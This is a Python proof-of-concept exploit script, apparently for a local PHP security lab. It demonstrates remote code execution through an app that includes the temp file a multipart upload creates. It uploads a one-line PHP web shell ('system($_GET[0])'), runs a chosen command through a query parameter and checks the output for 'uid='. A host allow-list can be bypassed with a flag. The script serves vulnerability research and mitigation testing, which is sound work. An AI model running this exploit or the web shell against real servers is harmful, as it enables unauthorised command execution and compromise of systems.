#!/usr/bin/env python3
"""Demonstrate that multipart uploads still create temp files with
session.upload_progress.enabled=0. The target app deliberately includes
the uploaded temp file. Local lab only.
"""
from __future__ import annotations

import argparse
import http.client
import secrets
import sys
from urllib.parse import urlencode, urlparse

ALLOWED = {"127.0.0.1", "localhost", "::1", "php-vuln", "php-mitigated", "nginx"}


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", default="http://127.0.0.1:8089/temp.php")
    parser.add_argument("--command", default="id")
    parser.add_argument("--allow-nonlocal", action="store_true")
    args = parser.parse_args()
    parsed = urlparse(args.target)
    if parsed.hostname not in ALLOWED and not args.allow_nonlocal:
        raise SystemExit(f"refusing non-lab host {parsed.hostname!r}")
    host, port = parsed.hostname, parsed.port or 80
    path = parsed.path or "/temp.php"
    query = urlencode({"0": args.command})
    boundary = "----u" + secrets.token_hex(8)
    payload = "<?php system($_GET[0]);?>"
    body = (
        f"--{boundary}\r\n"
        'Content-Disposition: form-data; name="f"; filename="a.php"\r\n'
        "Content-Type: application/octet-stream\r\n\r\n"
        f"{payload}\r\n"
        f"--{boundary}--\r\n"
    ).encode()
    conn = http.client.HTTPConnection(host, port, timeout=20)
    conn.request(
        "POST",
        path + "?" + query,
        body=body,
        headers={
            "Content-Type": f"multipart/form-data; boundary={boundary}",
            "Content-Length": str(len(body)),
        },
    )
    resp = conn.getresponse()
    data = resp.read()
    status = resp.status
    conn.close()
    text = data.decode("utf-8", "replace")
    print(f"[*] target={args.target} status={status} bytes={len(data)}")
    print(text[:600])
    hit = "uid=" in text
    print(f"[*] command output present: {hit}")
    return 0 if hit else 1


if __name__ == "__main__":
    sys.exit(main())
